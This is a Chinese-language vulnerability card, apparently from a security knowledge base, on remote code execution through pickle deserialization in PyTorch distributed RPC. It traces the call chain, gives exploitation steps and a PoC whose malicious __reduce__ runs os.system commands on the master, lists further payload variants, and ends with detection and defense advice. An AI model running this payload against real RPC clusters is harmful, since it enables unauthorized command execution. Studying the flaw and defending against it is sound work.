---
id: web-python-deserialization-pytorch-rpc-pythonudf-unpickler-rce
title: PyTorch distributed RPC PythonUDF 反序列化：master 端 UnpickledPythonCall 调 internal.deserialize 的 unpickler.load 触发 RCE
type: scenario
domain: web
path: web/python/deserialization
technique: pytorch-rpc-pythonudf-unpickler-deserialization
tags:
- pytorch
- rpc
- pickle
- deserialization
- rce
- python
- ai-framework
- distributed
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V245
  verified_at: '2026-11-07T12:53:33+08:00'
  notes: 已对照原文与51张图核对：接收链 TensorPipeAgent::onListenerAccepted→respond→cb_->operator()→processMessage→deserializePythonRpcCommand→deserializeRequest(PYTHON_CALL)→PythonCall::fromMessage→UnpickledPythonCall→PythonRpcHandler::deserialize→pyDeserialize_→torch.distributed.rpc.internal.deserialize→_internal_rpc_pickler.deserialize 的 unpickler.load()（图31-43，尤其图42红框）与卡一致；原文 PoC 为改 api.py 将 _default_pickler.serialize(PythonUDF(...)) 换成 serialize(Unsec())（__reduce__=(os.system,('ifconfig',))），属客户端复现方式，卡已注明真实攻击等价于自构造 PythonCall 载荷。原文未给该反序列化漏洞的版本区间，affected_versions 保持空；图51仅证明 2.4.1 仍可触发。dup-scan 判与任意函数调用卡 likely_duplicate：两卡前置相同但 sink/载荷/修复不同（unpickler.load vs _run_function），原文分列“命令注入/反序列化”两个漏洞，不属同一链，保留并列。未验证点：反序列化 PoC 无独立命令回显截图，未复跑。
url: /docs/web/python/deserialization/web-python-deserialization-pytorch-rpc-pythonudf-unpickler-rce/
draft: false
kb_aliases:
- PyTorch RPC 反序列化
- UnpickledPythonCall
- PythonRpcHandler deserialize
- torch.distributed.rpc.internal
- unpickler.load
- __reduce__ RPC
---

## 一句话结论

PyTorch RPC 的 master 在收到 `MessageType::PYTHON_CALL` 后，会把请求中的 `SerializedPyObj.payload` 交给 `UnpickledPythonCall`，最终经 `PythonRpcHandler::deserialize` → Python 层 `torch.distributed.rpc.internal.deserialize` → `_unpickler.load()` 反序列化；对端只要发送一个带 `__reduce__` 的恶意对象（原文 PoC 修改客户端 `api.py`，把 `PythonUDF` 换成恶意对象序列化），就能在 master 的反序列化阶段执行任意命令。

## 原理

- **接收入口**：master 的 `TensorPipeAgent::onListenerAccepted` 接受连接后调用 `respond(pipe)`；`respond` 读取 RPC 请求消息并调用 `cb_->operator()(requestMessage, streams)`（`cb_` 是 `RequestCallback`）。
- **分发到 PythonCall**：`RequestCallback::processMessage` → `deserializeRequest(request)`；`deserializeRequest` 按 `request.type()` 分支，`MessageType::PYTHON_CALL` 调用 `PythonCall::fromMessage`。随后 `deserializePythonRpcCommand` → `deserializePythonRpcCommandReference`，对 `MessageType::PYTHON_CALL` 构造 `UnpickledPythonCall(pc.serializedPyObj(), pc.isAsyncExecution())`。
- **反序列化 sink**：`UnpickledPythonCall` 构造函数中 `pythonUdf_ = pythonRpcHandler.deserialize(serializedPyObj)`；`PythonRpcHandler::deserialize` 调用 `pyDeserialize_(serializedObj.payload_, tensors)`。`pyDeserialize_` 是通过 `getFunction(rpcInternal, "deserialize")` 从 Python 模块 `torch.distributed.rpc.internal` 取出的函数。
- **Python 层 unpickle**：`internal.deserialize` 内部用 `_unpickler(io.BytesIO(binary_data))` 并调用 `unpickler.load()`。pickle 在还原对象时会执行 `__reduce__` 返回的可调用对象与参数，因此攻击者构造 `(os.system, ("cmd",))` 即可在反序列化阶段执行命令。
- **攻击面**：反序列化发生在执行 `_run_function` 之前；即使 master 不打算执行任何业务函数，只要收到 `PYTHON_CALL` 就会先走 pickle 还原。RPC 框架默认信任组内节点，没有对 pickle 载荷做类白名单、签名或来源校验。
- **原文的复现方式**：直接修改 `torch/distributed/rpc/api.py` 的 `_invoke_rpc`，把 `_default_pickler.serialize(PythonUDF(func, args, kwargs))` 替换为 `_default_pickler.serialize(Unsec())`，其中 `Unsec.__reduce__` 返回 `(os.system, ("ifconfig",))`；然后正常 `rpc_sync("master", ...)` 即可让 master 在反序列化时执行命令。等效地，真实攻击者只要自行构造并发送 `PythonCall` 的序列化载荷（前提是能作为 worker 加入 RPC 组）即可。
- **成立条件**：master 已 `init_rpc` 并接收连接；攻击者能加入同一 RPC 组（name/rank/world_size/init_method 匹配）；master 端的 `torch.distributed.rpc.internal` 使用默认 `_unpickler`（未做额外白名单）。

## 触发条件

- PyTorch 分布式 RPC 服务暴露且攻击者可连接/加入组；原文实验版本为 2.2.2，2.4.1 实测仍可触发。
- master 接收 `MessageType::PYTHON_CALL`，并在 `UnpickledPythonCall` 构造阶段对 `SerializedPyObj.payload` 调用默认 `_unpickler.load()`。
- 攻击者能控制发送端序列化内容（篡改本地 torch 库、编写自定义 RPC 客户端或替换 `PythonUDF` 载荷）。
- 无 pickle 类白名单/签名校验，且 RPC 端口未做网络隔离。

## 利用步骤

1. 确认目标 master 的 RPC 初始化地址、端口、节点名与 world_size；以 worker 身份加入同一 RPC 组。
2. 构造恶意类：
   ```python
   import os
   class Unsec(object):
       def __reduce__(self):
           return (os.system, ("id",))
   ```
3. 让发送端在 `_invoke_rpc` 中序列化该对象，而不是正常的 `PythonUDF`。原文做法是修改 `torch/distributed/rpc/api.py` 的 `else` 分支：
   ```python
   # (pickled_python_udf, tensors) = _default_pickler.serialize(
   #     PythonUDF(func, args, kwargs)
   # )
   (pickled_python_udf, tensors) = _default_pickler.serialize(Unsec())
   ```
4. 通过 `rpc_sync("master", ...)`（或任意会触发 `_invoke_rpc` 的调用）把恶意序列化数据发给 master。
5. master 的 `UnpickledPythonCall` → `PythonRpcHandler::deserialize` → `internal.deserialize` → `_unpickler.load()` 执行 `__reduce__`，命令以 master 进程权限运行。
6. 用 `id`/`ifconfig`/回连验证；清理本地对 torch 库的修改，避免影响后续正常 RPC。

## PoC

```python
import os
import torch
import torch.distributed.rpc as rpc

class Unsec(object):
    def __reduce__(self):
        return (os.system, ("id;ifconfig",))

# 原文通过修改 torch/distributed/rpc/api.py 的 _invoke_rpc：
#   from torch.distributed.rpc.api import _default_pickler
#   (pickled_python_udf, tensors) = _default_pickler.serialize(Unsec())
# 使后续 rpc_sync 发送的是恶意对象而非 PythonUDF。

options = rpc.TensorPipeRpcBackendOptions(init_method="tcp://192.168.140.210:29500")
rpc.init_rpc(name="worker", rank=1, world_size=2, rpc_backend_options=options)
try:
    rpc.rpc_sync("master", print, args=("trigger",))
finally:
    rpc.shutdown()
```

说明：PoC 依赖对客户端 `api.py` 的修改（原文复现方式），不是直接对官方 wheel 的未修改客户端可用；真实攻击等价于自行构造 `PythonCall` 载荷。仅在授权环境测试。

## 变体与关联

- **不同 `__reduce__` 载荷**：`(os.system, (cmd,))`、`(subprocess.Popen, ...)`、`(eval, (expr,))`；也可用 `__setstate__`/`BUILD` 等 pickle opcode 组合。
- **与任意函数调用卡对比**：[[web-python-framework-pytorch-rpc-arbitrary-function-call-rce]] 是利用 RPC 正常执行 `eval` 等危险可调用对象（sink 在 `_run_function`，`func(*args)`）；本卡是恶意 pickle 在 `unpickler.load()` 阶段执行（sink 在反序列化），两者共享“加入 RPC 组”前置条件但触发点不同。
- **其他 PyTorch 反序列化面**：分布式检查点 `.metadata`、`BYTE_IO`、`torch.load(weights_only=False)` 等文件加载路径，见 [[ai-security-supply-chain-pytorch-dcp-read-metadata-pickle-rce]]、[[ai-security-supply-chain-pytorch-dcp-load-bytes-weights-only-pickle-rce]]。
- **网络 pickle 同类**：[[web-python-deserialization-vllm-pynccl-pipe-network-pickle-rce]]（vLLM PyNcclPipe 对网络数据直接 `pickle.loads`）与本卡同属“AI 框架跨网络 pickle”模式。
- **边界**：官方将 RPC 定位为可信集群；若部署方做了网络隔离、mTLS/认证或对 `internal.deserialize` 增加白名单，攻击者无法加入组或反序列化会被拦截。

## 检测与防御

- **网络/认证**：RPC 端口不暴露到不可信网络；使用 mTLS、预共享凭据或服务网格对加入节点做认证，不能只靠 name/rank。
- **反序列化**：不要对跨网络数据使用默认 `pickle`；改为 JSON/protobuf 等安全格式，或使用受限 unpickler + 类白名单/签名校验；确保 `weights_only` 类安全加载策略适用于对应数据面。
- **运行**：master 以最小权限运行；监控 RPC 组中新出现的 rank/name、异常 `MessageType::PYTHON_CALL` 与短连接。
- **检测思路**：关注 `UnpickledPythonCall`/`PythonRpcHandler::deserialize` 调用、`internal.deserialize` 日志中异常的 `_unpickler` 载荷；对 RPC 消息做 pickle opcode 检查（`GLOBAL`/`REDUCE`/`BUILD` 指向 `os.system`、`subprocess` 等）。
